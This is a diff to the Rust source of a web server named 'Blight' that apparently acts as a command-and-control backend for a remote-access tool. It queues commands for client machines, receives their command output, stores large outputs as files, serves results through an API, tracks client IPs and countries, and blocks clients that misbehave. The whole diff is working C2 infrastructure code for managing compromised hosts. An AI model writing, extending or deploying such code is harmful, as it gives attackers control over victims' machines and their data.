@@ -9,6 +9,7 @@ use actix_web::{
 };
 
 use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey};
+use std::io::Read;
 use std::process::exit;
 use std::{
     time::SystemTime, 
@@ -463,7 +464,6 @@ async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id:
         }
     }
 }
-
 
 
 // ------------------------ General Functions ------------------------
@@ -963,17 +963,31 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
         if !all_keys_valid(&json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
             fprint("error", "Client didn't provide all keys when submitting output. Blocked for 20m.");
             block_client(&mut connection, &client_id, &ip, 1200).await;
-
             drop(connection); return resp_badrequest();
         }
 
         let command_id = key_to_string(&json, "command_id");
         let output_id = generate(8, "abcdef123456789");
-        let output = key_to_string(&json, "output");
+        let raw_output: Vec<u8> = match decode_block(&key_to_string(&json, "output")) {
+            Ok(output) => output,
+            Err(_) => {
+                fprint("error", &format!("({}) {}'s output was improperly formatted. Blocked for 20m.", &ip, &client_id));
+                block_client(&mut connection, &client_id, &ip, 1200).await;
+                drop(connection); return resp_unauthorised();
+            }
+        };
+        let parsed_output;
         
         // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
         
         if is_command(&mut connection, &command_id, &client_id).await && !is_client_blocked(&mut connection, &client_id, &ip).await {
+            if (&raw_output).len() >= 1024 {
+                let mut file = File::create(format!("artifacts/outputs/{}", &output_id)).unwrap();
+                file.write_all(&raw_output).unwrap();
+                parsed_output = format!("file:{}", output_id);
+            } else {
+                parsed_output = String::from_utf8(raw_output).unwrap();
+            }
 
             let (command_id, cmd_args, cmd_type, time_issued) = get_command_info(&mut connection, &command_id).await.unwrap();
             let output_insert: std::result::Result<Vec<String>, Error> = connection.exec(
@@ -996,7 +1010,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                     "client_id" => &client_id,
                     "cmd_args" => &cmd_args,
                     "cmd_type" => &cmd_type,
-                    "output" => &output,
+                    "output" => &parsed_output,
                     "time_issued" => &time_issued,
                     "time_received" => get_timestamp(),
 
@@ -1014,7 +1028,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                 Ok(_) => (),
                 Err(e) => fprint("error", &format!("Unable to delete command: {}",e))
             }
-            fprint("info", &format!("({}) {} completed command {} with type {}. Output: {}", &ip, &client_id, &command_id, &cmd_type, &output));
+            fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
             update_last_seen(&mut connection, &client_id).await;        
 
             drop(connection); return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes());
@@ -1168,15 +1182,27 @@ async fn api_get_output(req_body: String) -> impl Responder {
         let selected_outputs = output_selection_sql.unwrap().collect::<Row<>>().await;
 
         for row in selected_outputs.unwrap() {
+            let parsed_output;
+            
+            if value_to_str(&row, 5).starts_with("file") && Path::new(&format!("artifacts/outputs/{}", value_to_str(&row, 5).replace("file:", ""))).exists() {
+                let mut f = File::open(&format!("artifacts/outputs/{}", value_to_str(&row, 5).replace("file:", ""))).unwrap();
+                let mut buffer = Vec::new();
+                f.read_to_end(&mut buffer).unwrap();
+
+                parsed_output = encode_block(&buffer);
+            } else {
+                parsed_output = encode_block(value_to_str(&row, 5).as_bytes())
+            }
+
             json_outputs_list[value_to_str(&row, 0)] = json!(
                 {
-                    "version": value_to_u64(&row, 1),
-                    "command_id": value_to_str(&row, 2),
-                    "cmd_args": value_to_str(&row, 4),
-                    "cmd_type": value_to_str(&row, 5),
-                    "output": value_to_str(&row, 6),
-                    "time_issued": value_to_str(&row, 7),
-                    "time_recieved": value_to_str(&row, 8),
+                    "command_id": value_to_str(&row, 1),
+                    "client_id": value_to_str(&row, 2),
+                    "cmd_args": value_to_str(&row, 3),
+                    "cmd_type": value_to_str(&row, 4),
+                    "output": parsed_output,
+                    "time_issued": value_to_str(&row, 6),
+                    "time_recieved": value_to_str(&row, 7),
                 }
             );            
         }
@@ -1379,10 +1405,15 @@ async fn main() -> std::io::Result<()> {
 
     let json_config = fs::read("artifacts/configuration/server_config.json");
 
+    fs::create_dir_all("artifacts/configuration").unwrap();
+    fs::create_dir_all("artifacts/keys").unwrap();
+    fs::create_dir_all("artifacts/databases").unwrap();
+    fs::create_dir_all("artifacts/outputs").unwrap();
+
     match json_config {
         Ok(_) => (),
         Err(_) => {
-            write!(File::create("server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
+            write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                 &json!({
                     "host": "127.0.0.1:9999",
                     "connection_interval": 60,
@@ -1392,7 +1423,7 @@ async fn main() -> std::io::Result<()> {
                 })
             ).unwrap()).expect("Unable to write json file.");
 
-            fprint("info", "Your \"server_config.json\" file wasn't present. No worries, we've created it for you. ");
+            fprint("info", "Your \"artifacts/configuration/server_config.json\" file wasn't present. No worries, we've created it for you. ");
             fprint("info", "Open it in a text editor, and fill out the fields. Then, re-run Blight.");
             exit(1);
         }
@@ -1407,7 +1438,7 @@ async fn main() -> std::io::Result<()> {
     match geolite_db {
         Ok(_) => (),
         Err(_) => {
-            fprint("error", "You don't have \"GeoLite2-Country.mmdb\" dowloaded. Find it and place it in the current directory.");
+            fprint("error", "You don't have \"GeoLite2-Country.mmdb\" dowloaded. Find it and place it in \"artifacts/databases\"");
             exit(1);
         }
     };
